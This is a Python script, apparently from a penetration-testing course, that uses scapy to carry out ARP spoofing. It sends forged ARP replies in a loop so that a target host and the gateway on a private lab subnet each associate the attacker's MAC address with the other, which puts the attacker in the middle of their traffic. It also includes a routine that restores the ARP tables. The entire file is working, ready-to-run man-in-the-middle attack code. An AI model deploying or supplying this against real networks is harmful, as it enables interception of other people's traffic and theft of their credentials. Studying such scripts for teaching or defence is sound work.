#!/usr/bin/env python

import time
import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc  # this line will return the router's MAC address


# # the below code will fool the target in associating the "kali's" MAC address with the ip address of the router
# packet = scapy.ARP(op=2, pdst="10.211.55.29", hwdst="00:1c:42:a2:b2:37", psrc="10.211.55.1")
# # here 'op' is the field which is responsible for generating responses for the victim only during the spoofing
# # 'pdst' is the ip address of the target
# # 'hwdst' is the MAC address of the target
# # 'psrc' is the ip address of the router
# scapy.send(packet)  # this will send a packet updating the MAC address

# creating a function to perform the above task (performing the spoofing)
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# function to restore the network traffic (bringing it back to it's normal condition)
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # 'hwsrc' is for defining the source MAC address in the ARP table, else our MAC address would be used which would still be creating a spoof
    scapy.send(packet, count=4, verbose=False)


target_ip = "10.211.55.29"
gateway_ip = "10.211.55.1"


# keep sending the packets until we stop the spoofing manually from this machine
sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)  # fooling the machine that we are the router
        spoof(gateway_ip, target_ip)  # fooling the router that we are the real machine
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL+C... Resetting the ARP tables... Please wait")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)